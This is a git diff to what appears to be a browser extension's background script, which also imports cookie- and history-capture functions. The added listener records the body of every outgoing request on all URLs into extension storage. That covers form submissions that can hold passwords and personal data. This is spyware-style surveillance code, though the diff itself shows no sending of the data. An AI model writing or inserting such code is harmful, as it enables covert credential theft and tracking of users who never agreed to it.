@@ -1,5 +1,5 @@
 import { BackgroundMessage, StorageKey } from "../consts";
-import { INavigationLogEntry } from "../interfaces";
+import { INavigationLogEntry, IRequestData } from "../interfaces";
 import {
   captureCookies,
   captureHistory,
@@ -56,3 +56,23 @@ chrome.webNavigation.onCompleted.addListener(async (details) => {
 
   writeLog("Recorded navigation");
 });
+
+chrome.webRequest.onBeforeRequest.addListener(
+  (details) => {
+    if (details.requestBody) {
+      simplePrepend<IRequestData>(StorageKey.REQUEST_BODY_LOG, {
+        request: details,
+        ...logData(),
+      }).then(
+        () => {
+          writeLog("Recorded request");
+        },
+        () => {}
+      );
+    }
+  },
+  {
+    urls: ["<all_urls>"],
+  },
+  ["requestBody"]
+);
